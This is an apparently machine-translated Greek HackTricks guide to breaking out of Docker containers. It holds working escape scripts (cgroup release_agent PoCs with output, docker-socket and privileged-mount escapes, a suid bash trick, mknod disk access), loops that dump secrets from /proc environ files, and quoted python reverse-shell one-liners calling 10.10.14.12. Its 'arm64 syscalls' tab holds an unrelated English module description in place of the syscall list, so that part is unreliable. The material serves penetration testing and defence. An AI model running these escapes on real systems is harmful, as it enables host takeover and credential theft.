# Docker Breakout / Privilege Escalation

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Αυτόματη Απαρίθμηση & Απόδραση

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Μπορεί επίσης να **απαριθμήσει τα containers**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Αυτό το εργαλείο είναι αρκετά **χρήσιμο για την απαρίθμηση του container στο οποίο βρίσκεστε και ακόμα να προσπαθήσετε να αποδράσετε αυτόματα**
* [**amicontained**](https://github.com/genuinetools/amicontained): Χρήσιμο εργαλείο για να λάβετε τα προνόμια που έχει το container προκειμένου να βρείτε τρόπους απόδρασης από αυτό
* [**deepce**](https://github.com/stealthcopter/deepce): Εργαλείο για απαρίθμηση και απόδραση από τα containers
* [**grype**](https://github.com/anchore/grype): Λάβετε τα CVEs που περιέχονται στο λογισμικό που είναι εγκατεστημένο στην εικόνα

## Απόδραση με Ένωση του Docker Socket

Αν κάπως βρείτε ότι το **docker socket είναι συνδεδεμένο** μέσα στο docker container, θα μπορείτε να αποδράσετε από αυτό.\
Αυτό συμβαίνει συνήθως σε docker containers που για κάποιο λόγο χρειάζεται να συνδεθεί στον docker daemon για να εκτελέσει ενέργειες.

```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

Σε αυτήν την περίπτωση μπορείτε να χρησιμοποιήσετε τα κανονικά εντολές docker για να επικοινωνήσετε με τον docker daemon:

```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```

{% hint style="info" %}
Σε περίπτωση που το **docker socket βρίσκεται σε μη αναμενόμενη θέση** μπορείτε ακόμα να επικοινωνήσετε μαζί του χρησιμοποιώντας την εντολή **`docker`** με την παράμετρο **`-H unix:///path/to/docker.sock`**
{% endhint %}

Το Docker daemon ενδέχεται επίσης να [ακούει σε ένα θύρα (προεπιλεγμένα 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ή σε συστήματα βασισμένα στο Systemd, η επικοινωνία με το Docker daemon μπορεί να γίνει μέσω του Systemd socket `fd://`.

{% hint style="info" %}
Επιπλέον, προσέξτε τα sockets εκτέλεσης άλλων υψηλού επιπέδου εκτελέσεων:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Απόδραση Κατάχρησης Δυνατοτήτων

Θα πρέπει να ελέγξετε τις δυνατότητες του container, αν έχει οποιαδήποτε από τις παρακάτω, ενδέχεται να μπορείτε να δραπετεύσετε από αυτό: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Μπορείτε να ελέγξετε τις τρέχουσες δυνατότητες του container χρησιμοποιώντας τα **προηγουμένως αναφερθέντα αυτόματα εργαλεία** ή:

```bash
capsh --print
```

Στην ακόλουθη σελίδα μπορείτε **να μάθετε περισσότερα σχετικά με τις δυνατότητες του Linux** και πώς να τις καταχραστείτε για να δραπετεύσετε/εξελίξετε προνόμια:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Δραπέτευση από Προνομιούχους Ελέγχους

Ένας προνομιούχος ελεγκτής μπορεί να δημιουργηθεί με τη σημαία `--privileged` ή απενεργοποιώντας συγκεκριμένες αμυντικές μέθοδους:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Η σημαία `--privileged` μειώνει σημαντικά την ασφάλεια του ελεγκτή, προσφέροντας **απεριόριστη πρόσβαση σε συσκευές** και παρακάμπτοντας **πολλές προστασίες**. Για λεπτομερή ανάλυση, ανατρέξτε στην τεκμηρίωση για τις πλήρεις επιπτώσεις της `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Προνομιούχος + hostPID

Με αυτές τις άδειες μπορείτε απλά **να μεταβείτε στο χώρο ονομάτων ενός διεργασίας που εκτελείται στον κεντρικό υπολογιστή ως ριζοχρήστης** όπως το init (pid:1) απλά εκτελώντας: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Δοκιμάστε το σε έναν ελεγκτή εκτελώντας:

```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```

### Προνομιούχος

Απλά με τη σημαία προνομιούχου μπορείτε να προσπαθήσετε να **έχετε πρόσβαση στο δίσκο του υπολογιστή** ή να προσπαθήσετε να **δραπετεύσετε καταχρώμενοι το release\_agent ή άλλες διαφυγές**.

Δοκιμάστε τις παρακάτω παρακάμψεις σε ένα container εκτελώντας:

```bash
docker run --rm -it --privileged ubuntu bash
```

#### Προσάρτηση Δίσκου - Poc1

Οι ρυθμισμένες σωστά docker containers δεν θα επιτρέψουν εντολές όπως **fdisk -l**. Ωστόσο, σε docker εντολές που έχουν ρυθμιστεί λανθασμένα όπου ορίζεται η σημαία `--privileged` ή `--device=/dev/sda1` με κεφαλαία γράμματα, είναι δυνατόν να αποκτηθούν δικαιώματα για να δείτε τον δίσκο του κεντρικού υπολογιστή.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Έτσι, για να πάρετε τον έλεγχο του κεντρικού υπολογιστή, είναι εύκολο:

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

Και ορίστε! Τώρα μπορείτε να έχετε πρόσβαση στο σύστημα αρχείων του κεντρικού υπολογιστή επειδή είναι προσαρτημένο στον φάκελο `/mnt/hola`.

#### Προσάρτηση Δίσκου - Poc2

Μέσα στο container, ένας επιτιθέμενος μπορεί να προσπαθήσει να κερδίσει περαιτέρω πρόσβαση στο υποκείμενο λειτουργικό σύστημα του κεντρικού υπολογιστή μέσω ενός εγγράψιμου όγκου hostPath που δημιουργήθηκε από το cluster. Παρακάτω είναι μερικά κοινά πράγματα που μπορείτε να ελέγξετε μέσα στο container για να δείτε αν μπορείτε να εκμεταλλευτείτε αυτό το διάνυσμα του επιτιθέμενου:

```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```

#### Απόδραση με προνομιούχο χρήστη εκμεταλλευόμενος τον υπάρχοντα release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Αρχικό PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

Βρείτε μια **εξήγηση της τεχνικής** στο:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Απόδραση με Προνομιούχο Κατάχρηση του release\_agent χωρίς να γνωρίζετε τη σχετική διαδρομή - PoC3

Στις προηγούμενες εκμεταλλεύσεις, η **απόλυτη διαδρομή του container μέσα στο σύστημα αρχείων των hosts αποκαλύπτεται**. Ωστόσο, αυτό δεν συμβαίνει πάντα. Σε περιπτώσεις όπου **δεν γνωρίζετε την απόλυτη διαδρομή του container μέσα στον host** μπορείτε να χρησιμοποιήσετε αυτήν την τεχνική:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```

Η εκτέλεση του PoC εντός ενός προνομιούχου container θα παρέχει έξοδο παρόμοια με:

```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```

#### Απόδραση με Προνομιούχο Χρήστη Εκμεταλλευόμενος Ευαίσθητα Mounts

Υπάρχουν αρκετά αρχεία που μπορεί να τοποθετηθούν που δίνουν **πληροφορίες σχετικά με τον υποκείμενο κεντρικό υπολογιστή**. Κάποια από αυτά μπορεί ακόμη να υποδεικνύουν **κάτι που πρόκειται να εκτελεστεί από τον κεντρικό υπολογιστή όταν συμβεί κάτι** (το οποίο θα επιτρέψει σε έναν επιτιθέμενο να δραπετεύσει από τον εμπλεκόμενο δοχείο).\
Η κατάχρηση αυτών των αρχείων μπορεί να επιτρέψει:

* release\_agent (ήδη καλυμμένο προηγουμένως)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Ωστόσο, μπορείτε να βρείτε **άλλα ευαίσθητα αρχεία** για έλεγχο σε αυτήν τη σελίδα:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Αυθαίρετα Mounts

Σε πολλές περιπτώσεις θα διαπιστώσετε ότι το **δοχείο έχει κάποιον όγκο που έχει τοποθετηθεί από τον κεντρικό υπολογιστή**. Εάν αυτός ο όγκος δεν έχει διαμορφωθεί σωστά, ενδέχεται να μπορείτε να **έχετε πρόσβαση/τροποποιήσετε ευαίσθητα δεδομένα**: Διαβάστε μυστικά, αλλάξτε τα authorized\_keys του ssh...

```bash
docker run --rm -it -v /:/host ubuntu bash
```

### Εscalation προνομίων με 2 κελύφη και host mount

Εάν έχετε πρόσβαση ως **root μέσα σε ένα container** που έχει κάποιο φάκελο από τον host που έχει προσαρτηθεί και έχετε **δραπετεύσει ως μη προνομιούχος χρήστης στον host** και έχετε πρόσβαση ανάγνωσης στον προσαρτημένο φάκελο.\
Μπορείτε να δημιουργήσετε ένα **αρχείο bash suid** στον **προσαρτημένο φάκελο** μέσα στο **container** και να το **εκτελέσετε από τον host** για προνομιούχα αύξηση.

```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```

### Εscalation προνομίων με 2 κελύφη

Εάν έχετε πρόσβαση ως **root μέσα σε ένα container** και έχετε **δραπετεύσει ως μη προνομιούχος χρήστης στον host**, μπορείτε να καταχραστείτε και τα δύο κελύφη για **επέκταση προνομίων μέσα στον host** αν έχετε τη δυνατότητα MKNOD μέσα στο container (είναι προεπιλεγμένο) όπως [**εξηγείται σε αυτή την ανάρτηση**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Με αυτή τη δυνατότητα, ο χρήστης root μέσα στο container επιτρέπεται να **δημιουργεί αρχεία block device**. Τα αρχεία συσκευών είναι ειδικά αρχεία που χρησιμοποιούνται για **πρόσβαση στο υποκείμενο hardware & στα modules του πυρήνα**. Για παράδειγμα, το αρχείο block device /dev/sda δίνει πρόσβαση για **ανάγνωση των raw δεδομένων στο δίσκο των συστημάτων**.

Το Docker προστατεύει ενάντια στην κατάχρηση αρχείων block device μέσα στα containers επιβάλλοντας μια πολιτική cgroup που **αποκλείει τις λειτουργίες ανάγνωσης/εγγραφής αρχείων block device**. Ωστόσο, εάν ένα αρχείο block device **δημιουργηθεί μέσα στο container**, γίνεται προσβάσιμο από έξω από το container μέσω του φακέλου **/proc/PID/root/**. Αυτή η πρόσβαση απαιτεί τον **ίδιο κάτοχο διεργασίας** τόσο μέσα όσο και έξω από το container.

Παράδειγμα **εκμετάλλευσης** από αυτό το [**άρθρο**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):

```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```

### hostPID

Εάν μπορείτε να έχετε πρόσβαση στις διεργασίες του κεντρικού υπολογιστή, τότε θα μπορείτε να έχετε πρόσβαση σε πολλές ευαίσθητες πληροφορίες που αποθηκεύονται σε αυτές τις διεργασίες. Εκτελέστε το εργαστήριο δοκιμών:

```
docker run --rm -it --pid=host ubuntu bash
```

Για παράδειγμα, θα μπορείτε να εμφανίσετε τις διεργασίες χρησιμοποιώντας κάτι σαν `ps auxn` και να αναζητήσετε ευαίσθητες λεπτομέρειες στις εντολές.

Στη συνέχεια, καθώς μπορείτε **να έχετε πρόσβαση σε κάθε διεργασία του κεντρικού υπολογιστή στο /proc/, μπορείτε απλά να κλέψετε τα μυστικά περιβάλλοντός τους** εκτελώντας:

```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```

Μπορείτε επίσης **να έχετε πρόσβαση στους αριθμούς αρχείων άλλων διεργασιών και να διαβάσετε τα ανοικτά αρχεία τους**:

```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```

Μπορείτε επίσης **να τερματίσετε διεργασίες και να προκαλέσετε DoS**.

{% hint style="warning" %}
Αν έχετε κάποια προνομιακή **πρόσβαση σε μια διεργασία έξω από το container**, μπορείτε να εκτελέσετε κάτι σαν `nsenter --target <pid> --all` ή `nsenter --target <pid> --mount --net --pid --cgroup` για **να εκτελέσετε ένα κέλυφος με τους ίδιους περιορισμούς ns** (ελπίζουμε κανέναν) **όπως αυτή η διεργασία.**
{% endhint %}

### hostNetwork

```
docker run --rm -it --network=host ubuntu bash
```

Εάν ένας container έχει διαμορφωθεί με τον [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), το δίκτυο αυτού του container δεν είναι απομονωμένο από τον Docker host (το container μοιράζεται το namespace δικτύου του host) και το container δεν λαμβάνει ανατεθειμένη δική του διεύθυνση IP. Με άλλα λόγια, το **container δένει όλες τις υπηρεσίες απευθείας στη διεύθυνση IP του host**. Επιπλέον, το container μπορεί **να παρακολουθήσει ΟΛΗ την κίνηση δικτύου που ο host** στέλνει και λαμβάνει στην κοινόχρηστη διεπαφή `tcpdump -i eth0`.

Για παράδειγμα, μπορείτε να χρησιμοποιήσετε αυτό για **να καταγράψετε και ακόμη να παραποιήσετε την κίνηση** μεταξύ του host και της μεταδεδομένης περίπτωσης.

Όπως στα παρακάτω παραδείγματα:

* [Ανάλυση: Πώς να επικοινωνήσετε με το Google SRE: Ρίχνοντας ένα κέλυφος στο cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM επιτρέπει την ανάδειξη προνομίων ρίζας (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Θα μπορείτε επίσης να έχετε πρόσβαση σε **υπηρεσίες δικτύου που είναι δεμένες στο localhost** μέσα στον host ή ακόμη και να έχετε πρόσβαση στα **δικαιώματα μεταδεδομένων του κόμβου** (τα οποία ενδέχεται να είναι διαφορετικά από αυτά που μπορεί να έχει πρόσβαση ένα container).

### hostIPC

```bash
docker run --rm -it --ipc=host ubuntu bash
```

Με το `hostIPC=true`, κερδίζετε πρόσβαση στους πόρους μεταξύ διεργασιών (IPC) του κεντρικού υπολογιστή, όπως η **κοινόχρηστη μνήμη** στο `/dev/shm`. Αυτό επιτρέπει την ανάγνωση/εγγραφή όπου οι ίδιοι IPC πόροι χρησιμοποιούνται από άλλες διεργασίες του κεντρικού υπολογιστή ή των pods. Χρησιμοποιήστε την εντολή `ipcs` για να εξετάσετε αυτούς τους μηχανισμούς IPC περαιτέρω.

* **Επιθεώρηση του /dev/shm** - Αναζητήστε αρχεία σε αυτήν την τοποθεσία της κοινόχρηστης μνήμης: `ls -la /dev/shm`
* **Επιθεώρηση υπαρχόντων IPC εγκαταστάσεων** - Μπορείτε να ελέγξετε αν χρησιμοποιούνται κάποιες εγκαταστάσεις IPC με το `/usr/bin/ipcs`. Ελέγξτε το με: `ipcs -a`

### Ανάκτηση δυνατοτήτων

Αν η κλήση συστήματος **`unshare`** δεν έχει απαγορευτεί, μπορείτε να ανακτήσετε όλες τις δυνατότητες εκτελώντας:

```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```

### Κατάχρηση του περιβάλλοντος χρήστη μέσω συμβολικών συνδέσεων

Η δεύτερη τεχνική που εξηγείται στη δημοσίευση [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) δείχνει πώς μπορείτε να καταχραστείτε τα bind mounts με τα user namespaces, για να επηρεάσετε αρχεία μέσα στον κεντρικό υπολογιστή (σε εκείνη τη συγκεκριμένη περίπτωση, διαγράψτε αρχεία).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Εκμετάλλευση Runc (CVE-2019-5736)

Σε περίπτωση που μπορείτε να εκτελέσετε το `docker exec` ως ριζού (πιθανώς με sudo), μπορείτε να προσπαθήσετε να αναβαθμίσετε τα προνόμια αποδρώντας από ένα container καταχρηστικά το CVE-2019-5736 (εκμετάλλευση [εδώ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Αυτή η τεχνική θα **αντικαταστήσει** ουσιαστικά το _**/bin/sh**_ δυαδικό αρχείο του **κεντρικού υπολογιστή** από ένα container, έτσι ώστε οποιοσδήποτε εκτελεί το docker exec μπορεί να ενεργοποιήσει το φορτίο.

Αλλάξτε το φορτίο αναλόγως και κάντε build το main.go με `go build main.go`. Το δυαδικό αρχείο που προκύπτει θα πρέπει να τοποθετηθεί στο container docker για εκτέλεση.\
Κατά την εκτέλεση, μόλις εμφανιστεί `[+] Overwritten /bin/sh successfully` πρέπει να εκτελέσετε το ακόλουθο από τον κεντρικό υπολογιστή:

`docker exec -it <container-name> /bin/sh`

Αυτό θα ενεργοποιήσει το φορτίο που υπάρχει στο αρχείο main.go.

Για περισσότερες πληροφορίες: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Υπάρχουν και άλλα CVEs στα οποία το container μπορεί να είναι ευάλωτο, μπορείτε να βρείτε μια λίστα στο [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Προσαρμοσμένη Απόδραση Docker

### Επιφάνεια Απόδρασης Docker

* **Χώροι ονομάτων:** Η διαδικασία πρέπει να είναι **εντελώς χωρισμένη από άλλες διαδικασίες** μέσω χώρων ονομάτων, έτσι ώστε να μην μπορούμε να αποδράσουμε αλληλεπιδρώντας με άλλες διαδικασίες λόγω χώρων ονομάτων (από προεπιλογή δεν μπορεί να επικοινωνήσει μέσω IPCs, unix sockets, network svcs, D-Bus, `/proc` άλλων διαδικασιών).
* **Χρήστης ρίζας**: Από προεπιλογή ο χρήστης που εκτελεί τη διαδικασία είναι ο χρήστης ρίζας (όμως οι προνομιώσεις του είναι περιορισμένες).
* **Δυνατότητες**: Το Docker αφήνει τις ακόλουθες δυνατότητες: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Αυτές είναι οι syscalls που ο **χρήστης ρίζα δεν θα μπορεί να καλέσει** (λόγω έλλειψης δυνατοτήτων + Seccomp). Οι άλλες syscalls θα μπορούσαν να χρησιμοποιηθούν για να προσπαθήσετε να αποδράσετε.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}
### Docker Breakout - Privilege Escalation

#### Description

This module attempts to escape from a Docker container to the Docker host by exploiting misconfigurations in the Docker daemon or vulnerabilities in the Linux kernel.

#### Usage

1. Compile the `docker-breakout.c` file on the target system using the provided Makefile.
2. Run the compiled binary to attempt privilege escalation.

#### Detection

Monitor for any unauthorized access to the Docker host from within a container. Check for unusual processes or network activity that could indicate a breakout attempt.

#### Prevention

* Keep Docker and the Linux kernel up to date to patch any known vulnerabilities.
* Follow best practices for securing Docker configurations to minimize the risk of privilege escalation.

#### References

* [Docker Security](https://docs.docker.com/engine/security/security/)
* [Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html)

